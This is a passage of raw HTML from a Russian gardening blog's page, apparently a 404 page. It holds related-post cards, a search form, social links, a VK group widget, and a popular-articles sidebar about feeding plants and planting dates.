+    <div class="post-card__image"><a href="https://greenhome.blog/ukhod-za-cvetami/perekis-vodoroda-dlya-poliva-komnatnyh-tsvetov-proportsii-kak-razvodit/"><picture><source  sizes='(max-width: 330px) 100vw, 330px' type="image/webp" data-srcset="https://greenhome.blog/wp-content/uploads/2021/12/Perekis-vodoroda_glavnaya-330x140.jpg.webp 330w, https://greenhome.blog/wp-content/uploads/2021/12/Perekis-vodoroda_glavnaya-768x329.jpg.webp 768w, https://greenhome.blog/wp-content/uploads/2021/12/Perekis-vodoroda_glavnaya.jpg.webp 770w"><img width="330" height="140" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAUoAAACMAQMAAAAgIXJbAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAABxJREFUGBntwTEBAAAAwiD7p14KP2AAAAAAAMBFF4QAAcP9S24AAAAASUVORK5CYII=" class="attachment-thumb-wide size-thumb-wide wp-post-image lazyload" alt="Фото перекиси водорода_главная" decoding="async"   data-eio="p" data-src="https://greenhome.blog/wp-content/uploads/2021/12/Perekis-vodoroda_glavnaya-330x140.jpg" data-srcset="https://greenhome.blog/wp-content/uploads/2021/12/Perekis-vodoroda_glavnaya-330x140.jpg 330w, https://greenhome.blog/wp-content/uploads/2021/12/Perekis-vodoroda_glavnaya-768x329.jpg 768w, https://greenhome.blog/wp-content/uploads/2021/12/Perekis-vodoroda_glavnaya.jpg 770w" data-sizes="auto" /><noscript><img width="330" height="140" src="https://greenhome.blog/wp-content/uploads/2021/12/Perekis-vodoroda_glavnaya-330x140.jpg" class="attachment-thumb-wide size-thumb-wide wp-post-image" alt="Фото перекиси водорода_главная" decoding="async" srcset="https://greenhome.blog/wp-content/uploads/2021/12/Perekis-vodoroda_glavnaya-330x140.jpg 330w, https://greenhome.blog/wp-content/uploads/2021/12/Perekis-vodoroda_glavnaya-768x329.jpg 768w, https://greenhome.blog/wp-content/uploads/2021/12/Perekis-vodoroda_glavnaya.jpg 770w" sizes="(max-width: 330px) 100vw, 330px" data-eio="l" /></noscript></picture><div class="entry-meta"><span class="entry-category"><span>Уход за цветами</span></span><span class="entry-meta__info"><span class="entry-meta__comments" title="Комментарии"><span class="fa fa-comment-o"></span> 0</span></span></div></a></div><header class="entry-header"><div class="entry-title"><a href="https://greenhome.blog/ukhod-za-cvetami/perekis-vodoroda-dlya-poliva-komnatnyh-tsvetov-proportsii-kak-razvodit/">Как поливать комнатные цветы перекисью водорода, пропорции, как разводить</a></div></header><div class="post-card__content">Одним из самых дешевых и доступных средств, которые можно применять для полива комнатных цветов,</div>
+</div>
+<div id="post-3514" class="post-card post-card-related post-3514 post type-post status-publish format-standard has-post-thumbnail  category-ogorod">
+    <div class="post-card__image"><a href="https://greenhome.blog/ogorod/podkormka-kapusty-dlya-rosta-zavyazi-i-formirovaniya-kochana/"><picture><source  sizes='(max-width: 330px) 100vw, 330px' type="image/webp" data-srcset="https://greenhome.blog/wp-content/uploads/2021/07/Kapusta_glavnaya-330x140.jpg.webp 330w, https://greenhome.blog/wp-content/uploads/2021/07/Kapusta_glavnaya-768x329.jpg.webp 768w, https://greenhome.blog/wp-content/uploads/2021/07/Kapusta_glavnaya.jpg.webp 770w"><img width="330" height="140" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAUoAAACMAQMAAAAgIXJbAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAABxJREFUGBntwTEBAAAAwiD7p14KP2AAAAAAAMBFF4QAAcP9S24AAAAASUVORK5CYII=" class="attachment-thumb-wide size-thumb-wide wp-post-image lazyload" alt="Фото капусты_главная" decoding="async"   data-eio="p" data-src="https://greenhome.blog/wp-content/uploads/2021/07/Kapusta_glavnaya-330x140.jpg" data-srcset="https://greenhome.blog/wp-content/uploads/2021/07/Kapusta_glavnaya-330x140.jpg 330w, https://greenhome.blog/wp-content/uploads/2021/07/Kapusta_glavnaya-768x329.jpg 768w, https://greenhome.blog/wp-content/uploads/2021/07/Kapusta_glavnaya.jpg 770w" data-sizes="auto" /><noscript><img width="330" height="140" src="https://greenhome.blog/wp-content/uploads/2021/07/Kapusta_glavnaya-330x140.jpg" class="attachment-thumb-wide size-thumb-wide wp-post-image" alt="Фото капусты_главная" decoding="async" srcset="https://greenhome.blog/wp-content/uploads/2021/07/Kapusta_glavnaya-330x140.jpg 330w, https://greenhome.blog/wp-content/uploads/2021/07/Kapusta_glavnaya-768x329.jpg 768w, https://greenhome.blog/wp-content/uploads/2021/07/Kapusta_glavnaya.jpg 770w" sizes="(max-width: 330px) 100vw, 330px" data-eio="l" /></noscript></picture><div class="entry-meta"><span class="entry-category"><span>Огород</span></span><span class="entry-meta__info"><span class="entry-meta__comments" title="Комментарии"><span class="fa fa-comment-o"></span> 0</span></span></div></a></div><header class="entry-header"><div class="entry-title"><a href="https://greenhome.blog/ogorod/podkormka-kapusty-dlya-rosta-zavyazi-i-formirovaniya-kochana/">Чем подкормить капусту, чтобы завязался и рос кочан</a></div></header><div class="post-card__content">Для роста капусты, завязи и формирования плотного сочного кочана нужно обеспечить овощу правильную подкормку.</div>
+</div>
+<div id="post-13393" class="post-card post-card-related post-13393 post type-post status-publish format-standard has-post-thumbnail  category-ogorod">
+    <div class="post-card__image"><a href="https://greenhome.blog/ogorod/kogda-sazhat-kartofel-v-mae-2023-goda-po-lunnomu-kalendaryu/"><picture><source  sizes='(max-width: 330px) 100vw, 330px' type="image/webp" data-srcset="https://greenhome.blog/wp-content/uploads/2023/05/ozjVp7IkNtI-330x140.jpg.webp 330w, https://greenhome.blog/wp-content/uploads/2023/05/ozjVp7IkNtI-768x329.jpg.webp 768w, https://greenhome.blog/wp-content/uploads/2023/05/ozjVp7IkNtI.jpg.webp 770w"><img width="330" height="140" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAUoAAACMAQMAAAAgIXJbAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAABxJREFUGBntwTEBAAAAwiD7p14KP2AAAAAAAMBFF4QAAcP9S24AAAAASUVORK5CYII=" class="attachment-thumb-wide size-thumb-wide wp-post-image lazyload" alt="Фото посадки картофеля_главная" decoding="async"   data-eio="p" data-src="https://greenhome.blog/wp-content/uploads/2023/05/ozjVp7IkNtI-330x140.jpg" data-srcset="https://greenhome.blog/wp-content/uploads/2023/05/ozjVp7IkNtI-330x140.jpg 330w, https://greenhome.blog/wp-content/uploads/2023/05/ozjVp7IkNtI-768x329.jpg 768w, https://greenhome.blog/wp-content/uploads/2023/05/ozjVp7IkNtI.jpg 770w" data-sizes="auto" /><noscript><img width="330" height="140" src="https://greenhome.blog/wp-content/uploads/2023/05/ozjVp7IkNtI-330x140.jpg" class="attachment-thumb-wide size-thumb-wide wp-post-image" alt="Фото посадки картофеля_главная" decoding="async" srcset="https://greenhome.blog/wp-content/uploads/2023/05/ozjVp7IkNtI-330x140.jpg 330w, https://greenhome.blog/wp-content/uploads/2023/05/ozjVp7IkNtI-768x329.jpg 768w, https://greenhome.blog/wp-content/uploads/2023/05/ozjVp7IkNtI.jpg 770w" sizes="(max-width: 330px) 100vw, 330px" data-eio="l" /></noscript></picture><div class="entry-meta"><span class="entry-category"><span>Огород</span></span><span class="entry-meta__info"><span class="entry-meta__comments" title="Комментарии"><span class="fa fa-comment-o"></span> 0</span></span></div></a></div><header class="entry-header"><div class="entry-title"><a href="https://greenhome.blog/ogorod/kogda-sazhat-kartofel-v-mae-2023-goda-po-lunnomu-kalendaryu/">Благоприятные дни для посадки картофеля в мае 2023 года по лунному календарю, когда лучше сажать картошку</a></div></header><div class="post-card__content">Многие люди сажают картофель в мае, т.к. в ряде регионов при более ранней высадке</div>
+</div>
+<div id="post-552" class="post-card post-card-related post-552 post type-post status-publish format-standard has-post-thumbnail  category-sadovoe-oborudovanie tag-sadovoe-oborudovanie tag-uborka-snega">
+    <div class="post-card__image"><a href="https://greenhome.blog/sadovoe-oborudovanie/oborudovanie-dlya-uborki-snega/"><picture><source  sizes='(max-width: 330px) 100vw, 330px' type="image/webp" data-srcset="https://greenhome.blog/wp-content/uploads/2015/02/uborka-snega-330x140.jpg.webp 330w, https://greenhome.blog/wp-content/uploads/2015/02/uborka-snega-770x330.jpg.webp 770w"><img width="330" height="140" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAUoAAACMAQMAAAAgIXJbAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAABxJREFUGBntwTEBAAAAwiD7p14KP2AAAAAAAMBFF4QAAcP9S24AAAAASUVORK5CYII=" class="attachment-thumb-wide size-thumb-wide wp-post-image lazyload" alt="" decoding="async"   data-eio="p" data-src="https://greenhome.blog/wp-content/uploads/2015/02/uborka-snega-330x140.jpg" data-srcset="https://greenhome.blog/wp-content/uploads/2015/02/uborka-snega-330x140.jpg 330w, https://greenhome.blog/wp-content/uploads/2015/02/uborka-snega-770x330.jpg 770w" data-sizes="auto" /><noscript><img width="330" height="140" src="https://greenhome.blog/wp-content/uploads/2015/02/uborka-snega-330x140.jpg" class="attachment-thumb-wide size-thumb-wide wp-post-image" alt="" decoding="async" srcset="https://greenhome.blog/wp-content/uploads/2015/02/uborka-snega-330x140.jpg 330w, https://greenhome.blog/wp-content/uploads/2015/02/uborka-snega-770x330.jpg 770w" sizes="(max-width: 330px) 100vw, 330px" data-eio="l" /></noscript></picture><div class="entry-meta"><span class="entry-category"><span>Оборудование</span></span><span class="entry-meta__info"><span class="entry-meta__comments" title="Комментарии"><span class="fa fa-comment-o"></span> 0</span></span></div></a></div><header class="entry-header"><div class="entry-title"><a href="https://greenhome.blog/sadovoe-oborudovanie/oborudovanie-dlya-uborki-snega/">Садовое оборудование для уборки снега</a></div></header><div class="post-card__content">Дети всегда радуются при виде сугробов выпавшего снега, предвкушая катания на санках и игры</div>
+</div>
+<div id="post-11138" class="post-card post-card-related post-11138 post type-post status-publish format-standard has-post-thumbnail  category-ogorod">
+    <div class="post-card__image"><a href="https://greenhome.blog/ogorod/posadka-pertsa-na-rassadu-v-fevrale-2023-goda-po-lunnomu-kalendaryu/"><picture><source  sizes='(max-width: 330px) 100vw, 330px' type="image/webp" data-srcset="https://greenhome.blog/wp-content/uploads/2023/01/Rassada-pertsa_glavnaya-330x140.jpg.webp 330w, https://greenhome.blog/wp-content/uploads/2023/01/Rassada-pertsa_glavnaya-768x329.jpg.webp 768w, https://greenhome.blog/wp-content/uploads/2023/01/Rassada-pertsa_glavnaya.jpg.webp 770w"><img width="330" height="140" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAUoAAACMAQMAAAAgIXJbAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAABxJREFUGBntwTEBAAAAwiD7p14KP2AAAAAAAMBFF4QAAcP9S24AAAAASUVORK5CYII=" class="attachment-thumb-wide size-thumb-wide wp-post-image lazyload" alt="Фото рассады перца_главная" decoding="async"   data-eio="p" data-src="https://greenhome.blog/wp-content/uploads/2023/01/Rassada-pertsa_glavnaya-330x140.jpg" data-srcset="https://greenhome.blog/wp-content/uploads/2023/01/Rassada-pertsa_glavnaya-330x140.jpg 330w, https://greenhome.blog/wp-content/uploads/2023/01/Rassada-pertsa_glavnaya-768x329.jpg 768w, https://greenhome.blog/wp-content/uploads/2023/01/Rassada-pertsa_glavnaya.jpg 770w" data-sizes="auto" /><noscript><img width="330" height="140" src="https://greenhome.blog/wp-content/uploads/2023/01/Rassada-pertsa_glavnaya-330x140.jpg" class="attachment-thumb-wide size-thumb-wide wp-post-image" alt="Фото рассады перца_главная" decoding="async" srcset="https://greenhome.blog/wp-content/uploads/2023/01/Rassada-pertsa_glavnaya-330x140.jpg 330w, https://greenhome.blog/wp-content/uploads/2023/01/Rassada-pertsa_glavnaya-768x329.jpg 768w, https://greenhome.blog/wp-content/uploads/2023/01/Rassada-pertsa_glavnaya.jpg 770w" sizes="(max-width: 330px) 100vw, 330px" data-eio="l" /></noscript></picture><div class="entry-meta"><span class="entry-category"><span>Огород</span></span><span class="entry-meta__info"><span class="entry-meta__comments" title="Комментарии"><span class="fa fa-comment-o"></span> 0</span></span></div></a></div><header class="entry-header"><div class="entry-title"><a href="https://greenhome.blog/ogorod/posadka-pertsa-na-rassadu-v-fevrale-2023-goda-po-lunnomu-kalendaryu/">Когда сеять перец на рассаду в феврале 2023 года по лунному календарю, благоприятные дни</a></div></header><div class="post-card__content">Перец &#8212; очень требовательная культура. Он зависим от условий выращивания, климата, региона. В целом,</div>
+</div>
+<div id="post-14300" class="post-card post-card-related post-14300 post type-post status-publish format-standard has-post-thumbnail  category-ogorod">
+    <div class="post-card__image"><a href="https://greenhome.blog/ogorod/chem-podkormit-ogurtsy-v-teplitse/"><picture><source  sizes='(max-width: 330px) 100vw, 330px' type="image/webp" data-srcset="https://greenhome.blog/wp-content/uploads/2023/06/Ogurtsy-v-teplitse_glavnaya-330x140.jpg.webp 330w, https://greenhome.blog/wp-content/uploads/2023/06/Ogurtsy-v-teplitse_glavnaya-768x329.jpg.webp 768w, https://greenhome.blog/wp-content/uploads/2023/06/Ogurtsy-v-teplitse_glavnaya.jpg.webp 770w"><img width="330" height="140" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAUoAAACMAQMAAAAgIXJbAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAABxJREFUGBntwTEBAAAAwiD7p14KP2AAAAAAAMBFF4QAAcP9S24AAAAASUVORK5CYII=" class="attachment-thumb-wide size-thumb-wide wp-post-image lazyload" alt="Фото огурцов в теплице_главная" decoding="async"   data-eio="p" data-src="https://greenhome.blog/wp-content/uploads/2023/06/Ogurtsy-v-teplitse_glavnaya-330x140.jpg" data-srcset="https://greenhome.blog/wp-content/uploads/2023/06/Ogurtsy-v-teplitse_glavnaya-330x140.jpg 330w, https://greenhome.blog/wp-content/uploads/2023/06/Ogurtsy-v-teplitse_glavnaya-768x329.jpg 768w, https://greenhome.blog/wp-content/uploads/2023/06/Ogurtsy-v-teplitse_glavnaya.jpg 770w" data-sizes="auto" /><noscript><img width="330" height="140" src="https://greenhome.blog/wp-content/uploads/2023/06/Ogurtsy-v-teplitse_glavnaya-330x140.jpg" class="attachment-thumb-wide size-thumb-wide wp-post-image" alt="Фото огурцов в теплице_главная" decoding="async" srcset="https://greenhome.blog/wp-content/uploads/2023/06/Ogurtsy-v-teplitse_glavnaya-330x140.jpg 330w, https://greenhome.blog/wp-content/uploads/2023/06/Ogurtsy-v-teplitse_glavnaya-768x329.jpg 768w, https://greenhome.blog/wp-content/uploads/2023/06/Ogurtsy-v-teplitse_glavnaya.jpg 770w" sizes="(max-width: 330px) 100vw, 330px" data-eio="l" /></noscript></picture><div class="entry-meta"><span class="entry-category"><span>Огород</span></span><span class="entry-meta__info"><span class="entry-meta__comments" title="Комментарии"><span class="fa fa-comment-o"></span> 0</span></span></div></a></div><header class="entry-header"><div class="entry-title"><a href="https://greenhome.blog/ogorod/chem-podkormit-ogurtsy-v-teplitse/">Подкормка огурцов в теплице, какие удобрения и когда использовать</a></div></header><div class="post-card__content">Для получения богатого урожая огурцов в теплице овощную культуру необходимо обеспечить всеми необходимыми элементами</div>
+</div></div></div>			</section><!-- .error-404 -->
+
+		</main><!-- #main -->
+	</div><!-- #primary -->
+
+    
+<aside id="secondary" class="widget-area" itemscope itemtype="http://schema.org/WPSideBar">
+
+    
+	<div id="search-2" class="widget widget_search"><div class="widget-header">Поиск по сайту</div>
+<form role="search" method="get" id="searchform_2353" action="https://greenhome.blog/" class="search-form">
+    <label class="screen-reader-text" for="s_2353">Поиск: </label>
+    <input type="text" value="" name="s" id="s_2353" class="search-form__text">
+    <button type="submit" id="searchsubmit_2353" class="search-form__submit"></button>
+</form></div><div id="wpshop_widget_social_links-2" class="widget widget_wpshop_widget_social_links"><div class="widget-header">Следуйте за нами</div>
+<div class="social-links">
+    <div class="social-buttons social-buttons--square social-buttons--circle social-buttons--small">
+
+    <span class="social-button social-button__vk js-link" data-href="aHR0cHM6Ly92ay5jb20vZ3JlZW5ob21lYmxvZw==" data-target="_blank"></span><span class="social-button social-button__ok js-link" data-href="aHR0cHM6Ly9vay5ydS9ncm91cC81MzE5MjM5MjExNDMzNw==" data-target="_blank"></span><span class="social-button social-button__telegram js-link" data-href="aHR0cHM6Ly90Lm1lL2dyZWVuaG9tZWJsb2c=" data-target="_blank"></span><span class="social-button social-button__youtube js-link" data-href="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ0JQZEZYbVlKTXBLQnpwZDhMUm1SS0E=" data-target="_blank"></span>
+    </div>
+</div>
+
+</div><div id="custom_html-3" class="widget_text widget widget_custom_html"><div class="widget-header">Новое в нашем сообществе</div><div class="textwidget custom-html-widget"><script type="text/javascript" src="https://vk.com/js/api/openapi.js?169"></script>
+
+<!-- VK Widget -->
+<div id="vk_groups-sidebar"></div>
+<script type="text/javascript">
+VK.Widgets.Group("vk_groups-sidebar", {mode: 4, wide: 1, height: "400", color2: '111111', color3: '0DAF26'}, 96461927);
+</script></div></div><div id="wpshop_widget_articles-2" class="widget widget_wpshop_widget_articles"><div class="widget-header">Популярные записи</div><div class="widget-articles">
+<div class="widget-article widget-article--compact">
+            <div class="widget-article__image">
+            <a href="https://greenhome.blog/sad/chem-podkormit-yabloni-osenyu-v-sentyabre/">
+                <picture><source  sizes='(max-width: 80px) 100vw, 80px' type="image/webp" data-srcset="https://greenhome.blog/wp-content/uploads/2023/09/chem-podkormit-yabloni-v-sentyabre-1-80x80.jpg.webp 80w, https://greenhome.blog/wp-content/uploads/2023/09/chem-podkormit-yabloni-v-sentyabre-1-150x150.jpg.webp 150w"><img width="80" height="80" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAABQAQAAAACmas8AAAAAAnRSTlMAAHaTzTgAAAARSURBVCjPY2AYBaNgFNALAAADcAABkVpjHQAAAABJRU5ErkJggg==" class="attachment-thumb-square size-thumb-square wp-post-image lazyload" alt="чем подкормить яблони в сентябре фото" decoding="async"   data-eio="p" data-src="https://greenhome.blog/wp-content/uploads/2023/09/chem-podkormit-yabloni-v-sentyabre-1-80x80.jpg" data-srcset="https://greenhome.blog/wp-content/uploads/2023/09/chem-podkormit-yabloni-v-sentyabre-1-80x80.jpg 80w, https://greenhome.blog/wp-content/uploads/2023/09/chem-podkormit-yabloni-v-sentyabre-1-150x150.jpg 150w" data-sizes="auto" /><noscript><img width="80" height="80" src="https://greenhome.blog/wp-content/uploads/2023/09/chem-podkormit-yabloni-v-sentyabre-1-80x80.jpg" class="attachment-thumb-square size-thumb-square wp-post-image" alt="чем подкормить яблони в сентябре фото" decoding="async" srcset="https://greenhome.blog/wp-content/uploads/2023/09/chem-podkormit-yabloni-v-sentyabre-1-80x80.jpg 80w, https://greenhome.blog/wp-content/uploads/2023/09/chem-podkormit-yabloni-v-sentyabre-1-150x150.jpg 150w" sizes="(max-width: 80px) 100vw, 80px" data-eio="l" /></noscript></picture>            </a>
+        </div>
+    
+    <div class="widget-article__body">
+        <div class="widget-article__title"><a href="https://greenhome.blog/sad/chem-podkormit-yabloni-osenyu-v-sentyabre/">Подкормка яблони осенью в сентябре под зиму после сбора урожая, как удобрять молодые и старые деревья</a></div>
+
+        
+                    <div class="widget-article__description">
+                Сентябрь – лучшее время для осенних подкормок яблони. У культуры все еще продолжается активный            </div>
+        
+                    <div class="entry-meta">
+                                    <span class="entry-meta__comments" title="Комментарии"><span class="fa fa-comment-o"></span> 0</span>
+                                            </div>
+            </div>
+</div>
+<div class="widget-article widget-article--compact">
+            <div class="widget-article__image">
+            <a href="https://greenhome.blog/sad/chem-podkormit-gortenzii-v-iyule/">
+                <picture><source  sizes='(max-width: 80px) 100vw, 80px' type="image/webp" data-srcset="https://greenhome.blog/wp-content/uploads/2022/07/Podkormka-gortenzii_glavnaya-80x80.jpg.webp 80w, https://greenhome.blog/wp-content/uploads/2022/07/Podkormka-gortenzii_glavnaya-150x150.jpg.webp 150w"><img width="80" height="80" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAABQAQAAAACmas8AAAAAAnRSTlMAAHaTzTgAAAARSURBVCjPY2AYBaNgFNALAAADcAABkVpjHQAAAABJRU5ErkJggg==" class="attachment-thumb-square size-thumb-square wp-post-image lazyload" alt="Фото подкормки гортензии" decoding="async"   data-eio="p" data-src="https://greenhome.blog/wp-content/uploads/2022/07/Podkormka-gortenzii_glavnaya-80x80.jpg" data-srcset="https://greenhome.blog/wp-content/uploads/2022/07/Podkormka-gortenzii_glavnaya-80x80.jpg 80w, https://greenhome.blog/wp-content/uploads/2022/07/Podkormka-gortenzii_glavnaya-150x150.jpg 150w" data-sizes="auto" /><noscript><img width="80" height="80" src="https://greenhome.blog/wp-content/uploads/2022/07/Podkormka-gortenzii_glavnaya-80x80.jpg" class="attachment-thumb-square size-thumb-square wp-post-image" alt="Фото подкормки гортензии" decoding="async" srcset="https://greenhome.blog/wp-content/uploads/2022/07/Podkormka-gortenzii_glavnaya-80x80.jpg 80w, https://greenhome.blog/wp-content/uploads/2022/07/Podkormka-gortenzii_glavnaya-150x150.jpg 150w" sizes="(max-width: 80px) 100vw, 80px" data-eio="l" /></noscript></picture>            </a>
+        </div>
+    
+    <div class="widget-article__body">
+        <div class="widget-article__title"><a href="https://greenhome.blog/sad/chem-podkormit-gortenzii-v-iyule/">Подкормка гортензии в июле для пышного цветения</a></div>
+
+        
+                    <div class="widget-article__description">
+                Правильная подкормка гортензии в июле позволяет получить пышное и продолжительное цветение. Кроме того, с            </div>
+        
+                    <div class="entry-meta">
+                                    <span class="entry-meta__comments" title="Комментарии"><span class="fa fa-comment-o"></span> 0</span>
+                                            </div>
+            </div>
+</div>
+<div class="widget-article widget-article--compact">
+            <div class="widget-article__image">
+            <a href="https://greenhome.blog/sad/podkormka-yablon-v-iyune/">
+                <picture><source  sizes='(max-width: 80px) 100vw, 80px' type="image/webp" data-srcset="https://greenhome.blog/wp-content/uploads/2021/05/YAbloko-na-ladoni_glavnaya.jpg.webp 770w, https://greenhome.blog/wp-content/uploads/2021/05/YAbloko-na-ladoni_glavnaya-300x129.jpg.webp 300w, https://greenhome.blog/wp-content/uploads/2021/05/YAbloko-na-ladoni_glavnaya-768x329.jpg.webp 768w, https://greenhome.blog/wp-content/uploads/2021/05/YAbloko-na-ladoni_glavnaya-330x140.jpg.webp 330w"><img width="80" height="34" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAwIAAAFKAQMAAACU5nrTAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAADZJREFUGBntwTEBAAAAwiD7p14KP2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA3AR+VAABNzxJ/QAAAABJRU5ErkJggg==" class="attachment-thumb-square size-thumb-square wp-post-image lazyload" alt="Фото яблока на ладони_главная" decoding="async"   data-eio="p" data-src="https://greenhome.blog/wp-content/uploads/2021/05/YAbloko-na-ladoni_glavnaya.jpg" data-srcset="https://greenhome.blog/wp-content/uploads/2021/05/YAbloko-na-ladoni_glavnaya.jpg 770w, https://greenhome.blog/wp-content/uploads/2021/05/YAbloko-na-ladoni_glavnaya-300x129.jpg 300w, https://greenhome.blog/wp-content/uploads/2021/05/YAbloko-na-ladoni_glavnaya-768x329.jpg 768w, https://greenhome.blog/wp-content/uploads/2021/05/YAbloko-na-ladoni_glavnaya-330x140.jpg 330w" data-sizes="auto" /><noscript><img width="80" height="34" src="https://greenhome.blog/wp-content/uploads/2021/05/YAbloko-na-ladoni_glavnaya.jpg" class="attachment-thumb-square size-thumb-square wp-post-image" alt="Фото яблока на ладони_главная" decoding="async" srcset="https://greenhome.blog/wp-content/uploads/2021/05/YAbloko-na-ladoni_glavnaya.jpg 770w, https://greenhome.blog/wp-content/uploads/2021/05/YAbloko-na-ladoni_glavnaya-300x129.jpg 300w, https://greenhome.blog/wp-content/uploads/2021/05/YAbloko-na-ladoni_glavnaya-768x329.jpg 768w, https://greenhome.blog/wp-content/uploads/2021/05/YAbloko-na-ladoni_glavnaya-330x140.jpg 330w" sizes="(max-width: 80px) 100vw, 80px" data-eio="l" /></noscript></picture>            </a>
+        </div>
+    
+    <div class="widget-article__body">
+        <div class="widget-article__title"><a href="https://greenhome.blog/sad/podkormka-yablon-v-iyune/">Чем и как подкормить яблони в июне 2023 года для большого урожая</a></div>
+
+        
+                    <div class="widget-article__description">
+                Чтобы яблоня лучше плодоносила, в июне требуется продолжать подкормки. В это время в зависимости            </div>
+        
+                    <div class="entry-meta">
+                                    <span class="entry-meta__comments" title="Комментарии"><span class="fa fa-comment-o"></span> 0</span>
+                                            </div>
+            </div>
+</div>
+<div class="widget-article widget-article--compact">
+            <div class="widget-article__image">
+            <a href="https://greenhome.blog/ogorod/kogda-sazhat-perets-na-rassadu-na-urale-v-2023/">
+                <picture><source  sizes='(max-width: 80px) 100vw, 80px' type="image/webp" data-srcset="https://greenhome.blog/wp-content/uploads/2021/11/Rassada-pertsa_glavnaya-1.jpg.webp 770w, https://greenhome.blog/wp-content/uploads/2021/11/Rassada-pertsa_glavnaya-1-300x129.jpg.webp 300w, https://greenhome.blog/wp-content/uploads/2021/11/Rassada-pertsa_glavnaya-1-768x329.jpg.webp 768w, https://greenhome.blog/wp-content/uploads/2021/11/Rassada-pertsa_glavnaya-1-330x140.jpg.webp 330w"><img width="80" height="34" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAwIAAAFKAQMAAACU5nrTAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAADZJREFUGBntwTEBAAAAwiD7p14KP2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA3AR+VAABNzxJ/QAAAABJRU5ErkJggg==" class="attachment-thumb-square size-thumb-square wp-post-image lazyload" alt="Фото рассады перца_главная" decoding="async"   data-eio="p" data-src="https://greenhome.blog/wp-content/uploads/2021/11/Rassada-pertsa_glavnaya-1.jpg" data-srcset="https://greenhome.blog/wp-content/uploads/2021/11/Rassada-pertsa_glavnaya-1.jpg 770w, https://greenhome.blog/wp-content/uploads/2021/11/Rassada-pertsa_glavnaya-1-300x129.jpg 300w, https://greenhome.blog/wp-content/uploads/2021/11/Rassada-pertsa_glavnaya-1-768x329.jpg 768w, https://greenhome.blog/wp-content/uploads/2021/11/Rassada-pertsa_glavnaya-1-330x140.jpg 330w" data-sizes="auto" /><noscript><img width="80" height="34" src="https://greenhome.blog/wp-content/uploads/2021/11/Rassada-pertsa_glavnaya-1.jpg" class="attachment-thumb-square size-thumb-square wp-post-image" alt="Фото рассады перца_главная" decoding="async" srcset="https://greenhome.blog/wp-content/uploads/2021/11/Rassada-pertsa_glavnaya-1.jpg 770w, https://greenhome.blog/wp-content/uploads/2021/11/Rassada-pertsa_glavnaya-1-300x129.jpg 300w, https://greenhome.blog/wp-content/uploads/2021/11/Rassada-pertsa_glavnaya-1-768x329.jpg 768w, https://greenhome.blog/wp-content/uploads/2021/11/Rassada-pertsa_glavnaya-1-330x140.jpg 330w" sizes="(max-width: 80px) 100vw, 80px" data-eio="l" /></noscript></picture>            </a>
+        </div>
+    
+    <div class="widget-article__body">
+        <div class="widget-article__title"><a href="https://greenhome.blog/ogorod/kogda-sazhat-perets-na-rassadu-na-urale-v-2023/">Когда сеять перец на рассаду на Урале 2023 году по лунному календарю, благоприятные дни для посадки</a></div>
+
+        
+                    <div class="widget-article__description">
+                На Урале тоже можно вырастить перец. Но для этого придется посадить рассаду. Для выращивания            </div>
+        
+                    <div class="entry-meta">
+                                    <span class="entry-meta__comments" title="Комментарии"><span class="fa fa-comment-o"></span> 0</span>
+                                            </div>
+            </div>
+</div>
+<div class="widget-article widget-article--compact">
+            <div class="widget-article__image">
+            <a href="https://greenhome.blog/cvety/sadovye/rozy/pochemu-roza-prevrashhaetsya-v-shipovnik/">
+                <picture><source  sizes='(max-width: 80px) 100vw, 80px' type="image/webp" data-srcset="https://greenhome.blog/wp-content/uploads/2023/04/SHipovnik_glavnaya-80x80.jpg.webp 80w, https://greenhome.blog/wp-content/uploads/2023/04/SHipovnik_glavnaya-150x150.jpg.webp 150w"><img width="80" height="80" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAABQAQAAAACmas8AAAAAAnRSTlMAAHaTzTgAAAARSURBVCjPY2AYBaNgFNALAAADcAABkVpjHQAAAABJRU5ErkJggg==" class="attachment-thumb-square size-thumb-square wp-post-image lazyload" alt="Фото шиповника_главная" decoding="async"   data-eio="p" data-src="https://greenhome.blog/wp-content/uploads/2023/04/SHipovnik_glavnaya-80x80.jpg" data-srcset="https://greenhome.blog/wp-content/uploads/2023/04/SHipovnik_glavnaya-80x80.jpg 80w, https://greenhome.blog/wp-content/uploads/2023/04/SHipovnik_glavnaya-150x150.jpg 150w" data-sizes="auto" /><noscript><img width="80" height="80" src="https://greenhome.blog/wp-content/uploads/2023/04/SHipovnik_glavnaya-80x80.jpg" class="attachment-thumb-square size-thumb-square wp-post-image" alt="Фото шиповника_главная" decoding="async" srcset="https://greenhome.blog/wp-content/uploads/2023/04/SHipovnik_glavnaya-80x80.jpg 80w, https://greenhome.blog/wp-content/uploads/2023/04/SHipovnik_glavnaya-150x150.jpg 150w" sizes="(max-width: 80px) 100vw, 80px" data-eio="l" /></noscript></picture>            </a>
+        </div>
+    
+    <div class="widget-article__body">
+        <div class="widget-article__title"><a href="https://greenhome.blog/cvety/sadovye/rozy/pochemu-roza-prevrashhaetsya-v-shipovnik/">Почему роза перерождается в шиповник, причины перерождения и что делать</a></div>
+
+        
+                    <div class="widget-article__description">
+                Одной из проблемы при выращивании розы является то, что она перерождается в шиповник. В            </div>
+        
+                    <div class="entry-meta">
